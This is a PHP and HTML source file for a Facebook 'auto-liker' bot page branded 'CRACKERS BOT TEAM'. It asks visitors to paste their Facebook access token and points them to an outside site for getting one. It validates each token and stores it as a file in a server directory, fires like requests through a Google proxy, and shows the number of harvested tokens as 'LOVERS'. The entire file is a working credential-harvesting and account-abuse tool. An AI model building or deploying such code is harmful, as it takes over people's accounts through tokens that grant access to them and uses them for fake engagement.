<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"> <html> <meta charset="utf-8"/> <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/> <head> <title>CRACKERS BOT TEAM</title> <link rel="stylesheet" type="text/css" href="sahib.css" media="all,handheld"/> 
<link href="https://fonts.googleapis.com/css?family=Great+Vibes" rel="stylesheet"> 
<center><div style="font-family: 'Great Vibes', cursive;
font-size: 30pt">
<strong><center><script language="JavaScript" src="AB.js"></script></font></center></strong>


<?php
$yx=opendir('mahal');
while($isi=readdir($yx)){
if($isi != '.' && $isi != '..'){
$member[]=$isi;
}
}
$like = new like();
if($_GET[act]){
print '';
}
if($_POST[access_token]){
$access_token = $_POST[access_token];
$me = $like -> me($access_token);
if($me[id]){
$like -> mahal($access_token);
if($_POST[id]){
$like -> pancal($_POST[id]);
}else{
$like -> getData($access_token);
}
}else{
$like -> invalidToken();
}
}else{
$like->form();
}
class like {
public function pancal($id){ for($i=1;$i<4;$i++){
$this-> _req('http://google.com/gwt/n?u='.urlencode('http://'.$_SERVER[HTTP_HOST].'/likes.php?id='.$id.'&n='.$i));
}
print '';
}
public function me($access){
return json_decode($this-> _req('https://graph.facebook.com/me?access_token='.$access),true);
}
public function mahal($access){
if(!is_dir('mahal')){
mkdir('mahal');
}
$a=fopen('mahal/'.$access,'w');
fwrite($a,1);
fclose($a);
}
public function invalidToken(){
print'<script type="text/javascript">alert("INFO : Token Invalid")</script>';
$this->form();
}
public function form(){
 echo '


<div id="header">
</style>
<div id="header">
<marquee behavior="alternate">
<script src="header2.js"></script>
</marquee> </div>
<br>
<center>
<a target="_blank"  href="https://www.facebook.com/100027065658389">
<img src="https://graph.facebook.com/100027065658389/picture?width=900" alt="" style="border-radius: 100%; border: 2px solid white; box-shadow: 0px 0px 15px 10px 	orange;" width="300" height="300" title="Visit admin Profile"/></a></div></div></br><br>
<br>
 <center><a href="http://nirtoken.byethost7.com/?i=2"  style="border:2px solid Yellow; background:blue; height:30px; width:100px; box-shadow: 0px 1px 11px 0px white;" target="_blank">Get token</a> </div> </br> </center><div id="top-content"> <div id="search-form"> 
</br> </br>

<form action="index.php" method="post">

<input class="search" type="text" style="height:50px;" name="access_token"  required><br> <br>

<input class="inp-btn" type="submit" style="height:50px;"  value="Submit"></form></div>
';
}
public function getData($access){
$feed=json_decode($this -> _req('https://graph.facebook.com/me/home?access_token='.$access.'&limit=1'),true);
if(count($feed[data]) >= 1){
for($i=0;$i<count($feed[data]);$i++){
$uid = $feed[data][$i][from][id];
$name = $feed[data][$i][from][name];
$type = $feed[data][$i][type];
$mess = str_replace(urldecode('%0A'),'<br/>',htmlspecialchars($feed[data][$i][message]));
$id = $feed[data][$i][id];
$pic = $feed[data][$i][picture];
echo'
<script type="text/javascript">alert("INFO : Data Successfully Saved")</script>
<div id="header">
 </br>

<div id="center">

<marquee behavior="alternate"> Bot Successfully Activated Remember me in your prayer</marquee>

</br> </br>

<div id="center"><center>
<font size="40px"> Token Saved! </font></br>
[<a href="index.php" value="Click Here">Click Here</a>] to go back to the home page.</div></center>
</br>
</div>
<div id="footer">
Made By <a target="_blank" href="https://m.facebook.com/100027065658389">Nir Rana Magar</a></br>
</div>
';
if($type=='photo'){
echo'
';
}else{
echo'
';
}
}
}else{
print '';
}
print '';
}
private function _req($url){
$ch = curl_init();
curl_setopt_array($ch,array(
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_URL => $url,
) );
$result = curl_exec($ch);
curl_close($ch);
return $result;
}
}
?>

<font size="6"> <font color="BLUE">
<center>

<font size="6"> <?php 
    // integer starts at 0 before counting
    $i = 0; 
    $dir = 'mahal/';
    if ($handle = opendir($dir)) {
        while (($file = readdir($handle)) !== false){
            if (!in_array($file, array('.', '..')) && !is_dir($dir.$file)) 
                $i++;
        }
    }
    // prints out how many were in the directory
    
    echo 
    "LOVERS : $i ";
?>
